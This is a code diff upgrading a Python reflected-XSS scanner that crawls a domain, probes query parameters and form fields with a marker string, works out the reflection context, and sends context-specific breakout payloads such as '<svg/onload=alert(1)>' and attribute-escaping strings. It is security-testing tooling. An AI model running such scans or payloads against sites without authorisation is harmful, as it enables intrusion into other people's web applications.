@@ -8,19 +8,28 @@ import json
 import socket
 import time
 from dataclasses import dataclass
+from html import escape
 from html.parser import HTMLParser
 from typing import Iterable
 from urllib.error import HTTPError, URLError
 from urllib.parse import parse_qs, urlencode, urljoin, urlparse, urlunparse
 from urllib.request import Request, urlopen
 
-USER_AGENT = "XSS-Scanner/0.1 (authorized security testing only)"
+USER_AGENT = "XSS-Scanner/0.2 (authorized security testing only)"
+MARKER = "XSSSCANMARK"
 DEFAULT_PAYLOADS = [
     '<script>alert(1)</script>',
     '" onmouseover="alert(1)" x="',
     "<img src=x onerror=alert(1)>",
     "<svg/onload=alert(1)>",
 ]
+BREAKOUT_PAYLOADS = {
+    "html_text": ["<svg/onload=alert(1)>", "<img src=x onerror=alert(1)>", "</title><svg/onload=alert(1)>"],
+    "tag_or_unknown": ["><svg/onload=alert(1)>", "></script><svg/onload=alert(1)>"],
+    "attr_double": ['" autofocus onfocus=alert(1) x="', '"/><svg/onload=alert(1)>'],
+    "attr_single": ["' autofocus onfocus=alert(1) x='", "'/><svg/onload=alert(1)>"],
+    "script": ["';alert(1);//", '";alert(1);//', "</script><svg/onload=alert(1)>"],
+}
 COMMON_SUBDOMAIN_PREFIXES = ["www", "app", "api", "dev", "test", "staging", "admin", "portal", "beta", "m"]
 
 
@@ -154,7 +163,48 @@ def extract_form_details(html: str) -> list[dict]:
     return parser.forms
 
 
-def test_query_reflection(url: str, payloads: Iterable[str], timeout: float) -> list[Vulnerability]:
+def analyze_reflection_context(body: str, marker: str) -> str | None:
+    idx = body.find(marker)
+    if idx == -1:
+        return None
+
+    before = body[max(0, idx - 300) : idx].lower()
+    tail = body[idx : min(len(body), idx + 300)].lower()
+
+    last_script_open = before.rfind("<script")
+    last_script_close = before.rfind("</script>")
+    if last_script_open > last_script_close and "</script>" in tail:
+        return "script"
+
+    tag_open = before.rfind("<")
+    tag_close = before.rfind(">")
+    if tag_open > tag_close:
+        tag_segment = before[tag_open:]
+        if tag_segment.count('"') % 2 == 1:
+            return "attr_double"
+        if tag_segment.count("'") % 2 == 1:
+            return "attr_single"
+        return "tag_or_unknown"
+
+    return "html_text"
+
+
+def choose_breakout_payloads(context: str | None) -> list[str]:
+    if context is None:
+        return DEFAULT_PAYLOADS
+    return BREAKOUT_PAYLOADS.get(context, BREAKOUT_PAYLOADS["tag_or_unknown"])
+
+
+def reflection_is_escaped(body: str, marker: str) -> bool:
+    escaped_variants = {escape(marker), marker.replace("<", "&lt;").replace(">", "&gt;")}
+    return any(v in body for v in escaped_variants)
+
+
+def build_test_url(parsed, params: dict[str, str]) -> str:
+    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", urlencode(params), ""))
+
+
+def test_query_reflection(url: str, timeout: float) -> list[Vulnerability]:
     parsed = urlparse(url)
     params = parse_qs(parsed.query)
     findings: list[Vulnerability] = []
@@ -162,20 +212,40 @@ def test_query_reflection(url: str, payloads: Iterable[str], timeout: float) -> 
         return findings
 
     for param in params:
+        probe_params = {k: v[-1] for k, v in params.items()}
+        probe_params[param] = MARKER
+        probe_url = build_test_url(parsed, probe_params)
+        probe_resp = http_request(probe_url, timeout)
+        if not probe_resp or MARKER not in probe_resp.text:
+            continue
+
+        context = analyze_reflection_context(probe_resp.text, MARKER)
+        payloads = choose_breakout_payloads(context)
+        escaped = reflection_is_escaped(probe_resp.text, MARKER)
+
         for payload in payloads:
             test_params = {k: v[-1] for k, v in params.items()}
             test_params[param] = payload
-            test_query = urlencode(test_params)
-            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", test_query, ""))
+            test_url = build_test_url(parsed, test_params)
             resp = http_request(test_url, timeout)
-            if resp and payload in resp.text:
+            if not resp:
+                continue
+
+            if payload in resp.text:
+                escape_note = "Reflection appears HTML-escaped in probe response." if escaped else "Probe reflection was raw."
                 findings.append(
-                    Vulnerability(test_url, f"query parameter: {param}", payload, "Payload reflected in response body.")
+                    Vulnerability(
+                        test_url,
+                        f"query parameter: {param}",
+                        payload,
+                        f"Potential breakout in {context or 'unknown'} context. {escape_note}",
+                    )
                 )
+
     return findings
 
 
-def test_form_reflection(form: dict, current_url: str, payloads: Iterable[str], timeout: float) -> list[Vulnerability]:
+def test_form_reflection(form: dict, current_url: str, timeout: float) -> list[Vulnerability]:
     if not form.get("inputs"):
         return []
 
@@ -183,24 +253,58 @@ def test_form_reflection(form: dict, current_url: str, payloads: Iterable[str], 
     method = form.get("method", "get").lower()
     findings: list[Vulnerability] = []
 
-    for payload in payloads:
-        fields = {name: payload for name in form["inputs"]}
-        encoded = urlencode(fields).encode()
+    for field in form["inputs"]:
+        probe_fields = {name: "seed" for name in form["inputs"]}
+        probe_fields[field] = MARKER
+        probe_encoded = urlencode(probe_fields).encode()
+
         if method == "post":
-            resp = http_request(action_url, timeout, method="POST", data=encoded)
+            probe_resp = http_request(action_url, timeout, method="POST", data=probe_encoded)
         else:
             sep = "&" if urlparse(action_url).query else "?"
-            resp = http_request(f"{action_url}{sep}{urlencode(fields)}", timeout)
-        if resp and payload in resp.text:
-            findings.append(
-                Vulnerability(
-                    action_url,
-                    f"form ({method.upper()}) inputs: {', '.join(form['inputs'])}",
-                    payload,
-                    "Payload reflected in form response.",
+            probe_resp = http_request(f"{action_url}{sep}{urlencode(probe_fields)}", timeout)
+
+        if not probe_resp or MARKER not in probe_resp.text:
+            continue
+
+        context = analyze_reflection_context(probe_resp.text, MARKER)
+        payloads = choose_breakout_payloads(context)
+        escaped = reflection_is_escaped(probe_resp.text, MARKER)
+
+        for payload in payloads:
+            test_fields = {name: "seed" for name in form["inputs"]}
+            test_fields[field] = payload
+            encoded = urlencode(test_fields).encode()
+            if method == "post":
+                resp = http_request(action_url, timeout, method="POST", data=encoded)
+            else:
+                sep = "&" if urlparse(action_url).query else "?"
+                resp = http_request(f"{action_url}{sep}{urlencode(test_fields)}", timeout)
+
+            if resp and payload in resp.text:
+                escape_note = "Reflection appears HTML-escaped in probe response." if escaped else "Probe reflection was raw."
+                findings.append(
+                    Vulnerability(
+                        action_url,
+                        f"form field: {field} ({method.upper()})",
+                        payload,
+                        f"Potential breakout in {context or 'unknown'} context. {escape_note}",
+                    )
                 )
-            )
+
     return findings
+
+
+def dedupe_findings(findings: list[Vulnerability]) -> list[Vulnerability]:
+    seen: set[tuple[str, str, str]] = set()
+    unique: list[Vulnerability] = []
+    for f in findings:
+        key = (f.url, f.vector, f.payload)
+        if key in seen:
+            continue
+        seen.add(key)
+        unique.append(f)
+    return unique
 
 
 def scan(domain: str, timeout: float, max_links: int, delay: float) -> list[Vulnerability]:
@@ -230,11 +334,11 @@ def scan(domain: str, timeout: float, max_links: int, delay: float) -> list[Vuln
             if not page:
                 continue
             print(f"    [*] Testing: {url}")
-            findings.extend(test_query_reflection(url, DEFAULT_PAYLOADS, timeout))
+            findings.extend(test_query_reflection(url, timeout))
             for form in extract_form_details(page.text):
-                findings.extend(test_form_reflection(form, url, DEFAULT_PAYLOADS, timeout))
+                findings.extend(test_form_reflection(form, url, timeout))
 
-    return findings
+    return dedupe_findings(findings)
 
 
 def build_parser() -> argparse.ArgumentParser:
@@ -257,11 +361,11 @@ def main() -> None:
         print("No reflected XSS patterns found with current payload list.")
         return
 
-    for i, f in enumerate(findings, 1):
-        print(f"{i}. URL: {f.url}")
-        print(f"   Vector: {f.vector}")
-        print(f"   Payload: {f.payload}")
-        print(f"   Evidence: {f.evidence}")
+    for i, finding in enumerate(findings, 1):
+        print(f"{i}. URL: {finding.url}")
+        print(f"   Vector: {finding.vector}")
+        print(f"   Payload: {finding.payload}")
+        print(f"   Evidence: {finding.evidence}")
 
 
 if __name__ == "__main__":
